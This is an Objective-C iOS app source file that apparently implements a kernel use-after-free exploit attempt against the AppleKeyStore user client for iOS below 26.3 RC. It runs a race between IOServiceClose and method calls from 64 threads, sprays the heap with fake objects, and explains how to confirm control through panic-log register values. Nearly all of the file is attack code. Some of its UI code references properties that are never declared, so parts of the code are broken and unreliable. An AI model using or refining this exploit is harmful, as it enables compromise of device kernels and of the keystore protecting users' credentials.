#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   64          // Increased from 32 for better race chance
#define MAX_ATTEMPTS 5000        // Increased attempts

// ========== HEAP SPRAY CONFIGURATION ==========
#define SPRAY_COUNT         1000     // Increased for better coverage
#define SPRAY_BUFFER_SIZE   1024     // Larger fake object
#define SPRAY_DELAY_MS      50       // Reduced delay
#define REFILL_INTERVAL     10       // Refill spray every N attempts
// ==============================================

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;
static atomic_int   g_should_stop = 0;

// ========== HEAP SPRAY GLOBALS ==========
static io_connect_t g_spray_conns[SPRAY_COUNT];
static int g_spray_count = 0;
// ========================================

// ========== IMPROVED fake gate with correct padding ==========
typedef struct {
    // Initial fields
    uint64_t vtable;                    // +0x00
    uint64_t lock;                      // +0x08
    uint64_t refcount;                  // +0x10
    
    // Padding calculation: Need to reach 0x110
    // Currently at 0x18, need 0x110 - 0x18 = 0xF8 bytes = 31 uint64_t
    uint64_t pad1[31];                  // +0x18 to +0x10F (31 * 8 = 248 = 0xF8)
    
    // Critical field at +0x110 (this is what kernel dereferences at this+272)
    uint64_t target_at_0x110;           // +0x110: PRIMARY MARKER
    
    // Backup markers
    uint64_t marker_0x118;              // +0x118
    uint64_t marker_0x120;              // +0x120
    uint64_t marker_0x128;              // +0x128
    uint64_t marker_0x130;              // +0x130
    uint64_t marker_0x138;              // +0x138
    
    // Additional padding to fill buffer
    uint64_t pad2[110];                 // Fill to 1024 bytes total
} __attribute__((packed)) fake_gate_t;

// Compile-time assertions
_Static_assert(sizeof(fake_gate_t) == 1024, "fake_gate_t must be 1024 bytes");
_Static_assert(offsetof(fake_gate_t, target_at_0x110) == 0x110, "target_at_0x110 must be at offset 0x110");
_Static_assert(offsetof(fake_gate_t, marker_0x118) == 0x118, "marker_0x118 must be at offset 0x118");
// ===============================================================

static void *racer_thread(void *arg) {
    (void)arg;
    
    // Wait for phase 1
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        pthread_yield_np();
    
    // Racing loop
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        if (atomic_load(&g_should_stop)) {
            break;
        }
        
        uint64_t input[1] = {0xDEADBEEF};
        uint32_t out_cnt  = 0;
        
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            atomic_store(&g_should_stop, 1);
            break;
        }
        
        // Minimal yield to increase contention
        pthread_yield_np();
    }
    
    return NULL;
}

// ========== HEAP SPRAY FUNCTIONS ==========

static void init_fake_gate(fake_gate_t *gate, int variant) {
    memset(gate, 0, sizeof(fake_gate_t));
    
    // Basic structure
    gate->vtable = 0x4141414141414141ULL;
    gate->lock = 0x0000000000000000ULL;
    gate->refcount = 0x0000000100000001ULL;
    
    // Fill padding with pattern (helps identify in crash logs)
    for (int i = 0; i < 31; i++) {
        gate->pad1[i] = 0x2020202020202020ULL;
    }
    
    // Different marker patterns based on variant for debugging
    switch (variant % 6) {
        case 0:
            gate->target_at_0x110 = 0x4242424242424242ULL;  // Primary
            gate->marker_0x118 = 0x4343434343434343ULL;
            gate->marker_0x120 = 0x4444444444444444ULL;
            break;
        case 1:
            gate->target_at_0x110 = 0x5252525252525252ULL;  // Variant R
            gate->marker_0x118 = 0x5353535353535353ULL;
            gate->marker_0x120 = 0x5454545454545454ULL;
            break;
        case 2:
            gate->target_at_0x110 = 0x6262626262626262ULL;  // Variant b
            gate->marker_0x118 = 0x6363636363636363ULL;
            gate->marker_0x120 = 0x6464646464646464ULL;
            break;
        case 3:
            gate->target_at_0x110 = 0x7272727272727272ULL;  // Variant r
            gate->marker_0x118 = 0x7373737373737373ULL;
            gate->marker_0x120 = 0x7474747474747474ULL;
            break;
        case 4:
            gate->target_at_0x110 = 0x8282828282828282ULL;
            gate->marker_0x118 = 0x8383838383838383ULL;
            gate->marker_0x120 = 0x8484848484848484ULL;
            break;
        case 5:
            gate->target_at_0x110 = 0x9292929292929292ULL;
            gate->marker_0x118 = 0x9393939393939393ULL;
            gate->marker_0x120 = 0x9494949494949494ULL;
            break;
    }
    
    gate->marker_0x128 = 0x4545454545454545ULL;
    gate->marker_0x130 = 0x4646464646464646ULL;
    gate->marker_0x138 = 0x4747474747474747ULL;
    
    // Fill rest with pattern
    for (int i = 0; i < 110; i++) {
        gate->pad2[i] = 0x3030303030303030ULL;
    }
}

static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), BOOL is_refill) {
    kern_return_t kr;
    int start_idx = is_refill ? (g_spray_count / 2) : 0;
    int target_count = is_refill ? g_spray_count : SPRAY_COUNT;
    
    if (!is_refill) {
        log_callback(@"");
        log_callback(@"╔══════════════════════════════════════════════════╗");
        log_callback(@"║           HEAP SPRAY v4 - IMPROVED               ║");
        log_callback(@"╚══════════════════════════════════════════════════╝");
        log_callback([NSString stringWithFormat:@"Target connections: %d", SPRAY_COUNT]);
        log_callback([NSString stringWithFormat:@"Structure size: %zu bytes", sizeof(fake_gate_t)]);
        log_callback([NSString stringWithFormat:@"Marker at 0x110: VERIFIED ✓"]);
    } else {
        log_callback(@"[REFILL] Refreshing heap spray...");
    }
    
    // Step 1: Open connections
    int opened = 0;
    for (int i = start_idx; i < target_count; i++) {
        if (is_refill && g_spray_conns[i] != IO_OBJECT_NULL) {
            continue;
        }
        
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_spray_conns[i]);
        
        if (kr != KERN_SUCCESS) {
            if (kr == 0xe00002c7) {
                if (!is_refill) {
                    log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit at %d connections", i]);
                    g_spray_count = i;
                }
                break;
            }
            g_spray_conns[i] = IO_OBJECT_NULL;
            continue;
        }
        opened++;
    }
    
    if (!is_refill && g_spray_count == 0) {
        g_spray_count = opened;
    }
    
    if (!is_refill) {
        log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d connections", g_spray_count]);
    }
    
    // Step 2: Spray fake objects
    int sprayed = 0;
    for (int i = start_idx; i < g_spray_count; i++) {
        if (g_spray_conns[i] == IO_OBJECT_NULL) continue;
        
        fake_gate_t fakeGate;
        init_fake_gate(&fakeGate, i);
        
        uint64_t scalar_input = 0xDEADBEEF + i;
        kr = IOConnectCallMethod(
            g_spray_conns[i],
            1,  // method selector
            &scalar_input, 1,
            &fakeGate, sizeof(fakeGate),
            NULL, NULL,
            NULL, NULL
        );
        
        if (kr == KERN_SUCCESS) {
            sprayed++;
        }
    }
    
    if (!is_refill) {
        log_callback([NSString stringWithFormat:@"[SPRAY] Sprayed %d fake objects", sprayed]);
        log_callback(@"[SPRAY] ✓ Heap preparation complete");
        usleep(SPRAY_DELAY_MS * 1000);
    }
    
    return sprayed;
}

static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
    log_callback([NSString stringWithFormat:@"[CLEANUP] Closing %d connections", g_spray_count]);
    
    for (int i = 0; i < g_spray_count; i++) {
        if (g_spray_conns[i] != IO_OBJECT_NULL) {
            IOServiceClose(g_spray_conns[i]);
            g_spray_conns[i] = IO_OBJECT_NULL;
        }
    }
    
    g_spray_count = 0;
}

// ===============================================================

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *textView;
@property (weak, nonatomic) IBOutlet UIButton *testButton;
@property (nonatomic, strong) NSMutableString *logBuffer;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.logBuffer = [NSMutableString string];
    [self appendLog:@"UAF Tester v4 - Improved Ready"];
    [self appendLog:@"Changes: Better timing, larger spray, adaptive refill"];
}
- (void)buildUI {
    UILabel *title = [[UILabel alloc] init];
    title.text = @"AppleKeyStoreUserClient\nclose() UAF";
    title.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
    title.textColor = UIColor.whiteColor;
    title.textAlignment = NSTextAlignmentCenter;
    title.numberOfLines = 2;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    UILabel *subtitle = [[UILabel alloc] init];
    subtitle.text = @"IOServiceClose vs externalMethod race\niOS <26.3 RC";
    subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
    subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
    subtitle.textAlignment = NSTextAlignmentCenter;
    subtitle.numberOfLines = 2;
    subtitle.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:subtitle];

    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.triggerButton setTitle:@"CLOSE() UAF" forState:UIControlStateNormal];
    self.triggerButton.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:22];
    [self.triggerButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    self.triggerButton.layer.cornerRadius = 12;
    self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.triggerButton addTarget:self action:@selector(triggerTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.triggerButton];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:14];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] init];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [title.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [title.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [subtitle.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:8],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.triggerButton.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:24],
        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.triggerButton.widthAnchor constraintEqualToConstant:240],
        [self.triggerButton.heightAnchor constraintEqualToConstant:56],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:16],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

- (void)appendLog:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.logBuffer appendFormat:@"%@\n", msg];
        self.textView.text = self.logBuffer;
        
        NSRange bottom = NSMakeRange(self.textView.text.length - 1, 1);
        [self.textView scrollRangeToVisible:bottom];
    });
    NSLog(@"%@", msg);
}

- (IBAction)runTest:(id)sender {
    self.testButton.enabled = NO;
    [self.logBuffer setString:@""];
    [self appendLog:@"═══════════════════════════════════════"];
    [self appendLog:@"  UAF Test v4 - IMPROVED STRATEGY"];
    [self appendLog:@"═══════════════════════════════════════"];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self runImprovedUAF];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.testButton.enabled = YES;
        });
    });
}

- (void)runImprovedUAF {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                                                    IOServiceMatching(AKS_SERVICE));
    if (!svc) {
        [self appendLog:@"❌ Failed to find AppleKeyStore service"];
        return;
    }
    
    // Reset atomics
    atomic_store(&g_phase, 0);
    atomic_store(&g_calls, 0);
    atomic_store(&g_errors, 0);
    atomic_store(&g_should_stop, 0);
    
    // ===== PHASE 1: INITIAL HEAP SPRAY =====
    [self appendLog:@""];
    [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
    
    int spray_result = heap_spray_phase(svc, ^(NSString *msg) {
        [self appendLog:msg];
    }, NO);
    
    if (spray_result < 100) {
        [self appendLog:@"❌ Heap spray failed - insufficient objects"];
        IOObjectRelease(svc);
        return;
    }
    
    // ===== PHASE 2: UAF TRIGGER WITH ADAPTIVE REFILL =====
    [self appendLog:@""];
    [self appendLog:@">>> PHASE 2: UAF TRIGGER (ADAPTIVE)"];
    
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
        [self appendLog:@"❌ Failed to open target connection"];
        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
        IOObjectRelease(svc);
        return;
    }
    
    [self appendLog:@"[UAF] Target connection opened"];
    
    // Start racer threads
    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_create(&threads[i], NULL, racer_thread, NULL);
    }
    
    atomic_store_explicit(&g_phase, 1, memory_order_release);
    [self appendLog:[NSString stringWithFormat:@"[UAF] Started %d racer threads", NUM_RACERS]];
    
    // Main trigger loop with periodic refill
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        if (atomic_load(&g_should_stop)) {
            [self appendLog:[NSString stringWithFormat:@"✓ UAF TRIGGERED at attempt %d!", attempt]];
            break;
        }
        
        // Periodic heap refill to maintain spray coverage
        if (attempt > 0 && attempt % REFILL_INTERVAL == 0) {
            heap_spray_phase(svc, ^(NSString *msg) {
                // Silent refill
            }, YES);
        }
        
        // The critical race window
        kr = IOServiceClose(g_conn);
        
        // Very short delay to maximize race condition
        usleep(1);
        
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
        if (kr != KERN_SUCCESS) {
            [self appendLog:@"[UAF] Reopen failed - possible trigger!"];
            atomic_store(&g_should_stop, 1);
            break;
        }
        
        // Progress logging
        if ((attempt + 1) % 500 == 0) {
            uint32_t calls = atomic_load(&g_calls);
            uint32_t errors = atomic_load(&g_errors);
            [self appendLog:[NSString stringWithFormat:@"[%d/%d] calls=%u errors=%u", 
                            attempt + 1, MAX_ATTEMPTS, calls, errors]];
        }
    }
    
    // Stop racers
    atomic_store_explicit(&g_phase, 3, memory_order_release);
    
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // ===== RESULTS =====
    uint32_t total_calls = atomic_load(&g_calls);
    uint32_t total_errors = atomic_load(&g_errors);
    
    [self appendLog:@""];
    [self appendLog:@"═══════════════════════════════════════"];
    [self appendLog:@"  TEST RESULTS"];
    [self appendLog:@"═══════════════════════════════════════"];
    [self appendLog:[NSString stringWithFormat:@"Total racer calls:    %u", total_calls]];
    [self appendLog:[NSString stringWithFormat:@"Port death events:    %u", total_errors]];
    [self appendLog:[NSString stringWithFormat:@"Spray objects:        %d", spray_result]];
    
    if (total_errors > 0) {
        [self appendLog:@""];
        [self appendLog:@"✓✓✓ UAF SUCCESSFULLY TRIGGERED! ✓✓✓"];
        [self appendLog:@""];
        [self appendLog:@"Next steps:"];
        [self appendLog:@"1. Connect device to Mac/PC"];
        [self appendLog:@"2. Run: idevicecrashreport -e"];
        [self appendLog:@"3. Find latest panic-full-*.ips"];
        [self appendLog:@"4. Check x16 register value:"];
        [self appendLog:@""];
        [self appendLog:@"Expected marker values:"];
        [self appendLog:@"  0x4242... = Variant 0 (offset 0x110) ✓"];
        [self appendLog:@"  0x5252... = Variant 1"];
        [self appendLog:@"  0x6262... = Variant 2"];
        [self appendLog:@"  0x7272... = Variant 3"];
        [self appendLog:@"  0x8282... = Variant 4"];
        [self appendLog:@"  0x9292... = Variant 5"];
        [self appendLog:@""];
        [self appendLog:@"If x16 shows ANY of these = HEAP SPRAY SUCCESS! 🎉"];
    } else {
        [self appendLog:@""];
        [self appendLog:@"⚠️ UAF not detected in this run"];
        [self appendLog:@"Try running again or adjust parameters"];
    }
    [self appendLog:@"═══════════════════════════════════════"];
    
    // Cleanup
    if (g_conn != IO_OBJECT_NULL) {
        IOServiceClose(g_conn);
    }
    
    heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
    IOObjectRelease(svc);
}

@end
